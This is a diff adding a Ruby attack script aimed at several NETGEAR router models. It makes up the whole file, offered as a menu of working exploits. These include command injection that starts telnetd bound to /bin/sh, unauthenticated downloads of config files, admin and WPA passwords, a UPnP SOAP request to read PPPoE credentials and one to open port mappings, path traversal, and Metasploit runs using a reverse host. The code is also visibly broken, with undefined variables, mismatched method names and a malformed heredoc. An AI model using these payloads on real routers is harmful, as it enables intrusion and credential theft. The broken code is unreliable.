@@ -1,0 +1,159 @@
+#!/usr/bin/ruby
+require 'socket'
+require 'httpclient'
+require 'watir'
+require 'handsoap'  
+puts "iput the host url and pick the reverse tcphost"  
+host = ARGV[0]  
+reversehost = ARGV[1] 
+def WPN
+	puts "This exploit just gets the config file" 
+	targ = host + "/cgi-bin/NETGEAR_wpn824v3.cfg"
+	targ1 = host + ":8080/cgi-bin/NETGEAR_wpn824v3.cfg"
+	s = HTTPClient.get(targ) 
+	puts s.body 
+	t = HTTPClient.get(targ1)
+	puts t.body
+end
+
+def DGNseries 
+	puts "Input the model number remember just put the number" 
+	number = gets.chomp 
+	if number == "1000B"
+		url = host + "/ping.cgi?"
+		HTTPClient.get url + "IPAddr1=a&IPAddr2=b&IPAddr3=c&IPAddr4=d&ping=xxxx&ping_IPAddr=|/usr/sbin/telnetd -p 3503 -l /bin/sh"					
+		sr = `proxychains nmap -Pn -p3503`
+		puts sr 
+		url1 = host + "/setup.cgi?UPnP=UPnP&AdverTime=30&TimeToLive=`/usr/sbin/telnetd -p 3054`&save=+Anwenden&todo=save&this_file=upnp.htm&next_file=upnp.htm&h_UPnP=enable&hiddenAdverTime=30&hiddenTimeToLive=4"
+		HTTPClient.get(url1) 
+		tr = `proxychains nmap -Pn #{host} -p 3054`	
+		puts tr
+	elsif number == "2200B"
+		#metasploit pppoe.cgi 
+		`msfconsole -x "use exploit/linux/http/netgear_dgn2200b_pppoe_exec; set RHOST #{host}; set PASSWORD password; set SRVHOST #{reversehost}; set USERNAME admin; set LPORT 3553; exploit"`			
+	elsif number == "2200"
+		#todo	
+
+	
+	end 
+
+	
+end 
+
+
+
+
+def Backdoor 
+
+end 
+
+
+def FM114P 
+	puts "this module is a firewall attacker it only atacks FM144P" 
+	port = STDIN.gets.chomp 
+	puts "This particular attack gets the config file open" 
+	url3 = host + ":" + port + "/upnp/service/%2e%2e%2fnetgear.cfg"
+	sub = HTTPClient.get(url3) 
+	puts sub.body 
+	
+	puts "This attack reveals the username and password"
+	sub1 = host + ":80" + "/upnp/service/WANPPPConnection"
+	data = {"HOST" => "192.168.0.1:80","SOAPACTION" => "urn:schemas-upnp-org:service:WANPPPConnection:1#GetUserName"}
+	envelope = <<EOF-<?xml version="1.0" encoding="utf-8"?>
+	<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
+	xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
+	<s:Body>
+	<u:GetUserName
+	xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1" />
+	</s:Body>
+	</s:Envelope>
+
+EOF
+
+	sx = HTTPClient.post(sub1, data, envelope) 
+	puts sx.body 
+	
+	puts "this attack gets you to open up a port to an internal client" 
+	fmport = STDIN.gets.chomp 
+	fmhost = STDIN.gets.chomp 
+	trgn = host + "/upnp/service/WANPPPConnection"
+	data = {"Content-Type" => 'text/xml; charset="utf-8"', 'SOAPAction' => "urn:schemas-upnp-org:service:WANPPPConnection:1#AddPortMapping", "host" => "192.168.0.1", 'Content-Length' => 1123, 'Connection' => "Keep-Alive", 'Pragma' => "no-cache"}
+	env1 = <<EOF-<?xml version="1.0"?>
+	<SOAP-ENV:Envelope
+	xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+	SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+	<SOAP-ENV:Body>
+	<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANPPPConnection:1">
+	<NewRemoteHost xmlns:dt="urn:schemas-microsoft-com:datatypes"
+	dt:dt="string"></NewRemoteHost>
+	<NewExternalPort xmlns:dt="urn:schemas-microsoft-com:datatypes"
+	dt:dt="ui2">#{fmport}</NewExternalPort>
+	<NewProtocol xmlns:dt="urn:schemas-microsoft-com:datatypes"
+	dt:dt="string">TCP</NewProtocol>
+	<NewInternalPort xmlns:dt="urn:schemas-microsoft-com:datatypes"
+	dt:dt="ui2">#{fmport}</NewInternalPort>
+	<NewInternalClient xmlns:dt="urn:schemas-microsoft-com:datatypes"
+	dt:dt="string">#{fmhost}</NewInternalClient>
+	<NewEnabled xmlns:dt="urn:schemas-microsoft-com:datatypes"
+	dt:dt="boolean">1</NewEnabled>
+	<NewPortMappingDescription xmlns:dt="urn:schemas-microsoft-com:datatypes"
+	dt:dt="string">NetBios</NewPortMappingDescription>
+	<NewLeaseDuration xmlns:dt="urn:schemas-microsoft-com:datatypes"
+	dt:dt="ui4">0</NewLeaseDuration>
+	</m:AddPortMapping>
+	</SOAP-ENV:Body>
+	</SOAP-ENV:Envelope>
+
+EOF
+ 
+end 
+
+
+def WRN 
+	puts "Input the Model Number remember don't put in WRN" 
+	wrno = STDIN.gets.chomp 
+	if wrno == 2000
+		puts "This Exploit gets the WPA password."
+		wrtarg = host + "/router-info.htm"
+		wrtarg1 = host + "/cgi-bin/router-info.htm"
+		wrq = HTTPClient.get(wrtarg)
+		wrq1 = HTTPClient.get(wrtarg1) 
+		puts wrq.body
+		puts wrq1.body 
+		puts "This Exploit gets the admin password."
+		wrtarg2 = host + "/cgi-bin/NETGEAR_WNR2000.cfg"
+		wrq2 = HTTPClient.get(wrtarg2) 
+		puts wrq2.body 
+		
+		 	
+	elsif wrno == 1000
+		puts "this extracts passwords" 
+		`msfconsole -x "use auxiliary/admin/http/netgear_soap_password_extractor; set RHOST #{host}; exploit"`	
+				
+	elsif wrno == 500 
+		puts "This exploit gives file traversal"
+		puts "Input the file you want to see" 
+		wrnfile = STDIN.gets.chomp 	
+		wrtarg3 = host + "/cgi-bin/webproc?getpage=#{wrnfile}&var:menu=advanced&var" 
+		wrq3 = HTTPClient.get(wrtarg3) 
+		puts wrq3.body 
+		
+	end 
+end 
+
+
+def control
+	puts "Input the model series of the router"
+	cch = STDIN.gets.chomp
+	if cch.downcase == "wrn"
+		WRN
+	elsif cch.downcase == "fm"
+		FM114P
+	elsif cch.downcase == "wpn"
+		WPN
+	elsif cch.downcase == "dgn"
+		DGNSeries
+	else 
+		puts "Sorry we don't have it"
+	end
+end
